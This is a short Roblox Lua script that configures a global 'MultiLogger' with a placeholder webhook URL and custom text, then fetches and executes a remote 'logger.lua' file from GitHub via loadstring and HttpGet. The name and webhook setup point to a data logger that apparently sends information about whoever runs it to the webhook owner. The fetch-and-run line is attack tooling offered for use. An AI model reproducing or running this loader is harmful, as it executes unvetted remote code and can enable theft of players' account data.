getgenv().MutliLogger = {
    Webhook = {
        ["URL"] = "YOUR_WEBHOOK_HERE"
    },
    Text = {
        ["CustomText"] = "CUSTOM_TEXT_HERE"
    }
}


loadstring(game:HttpGet("https://raw.githubusercontent.com/MultiLogger/MutliLogger-Roblox/main/logger.lua"))()
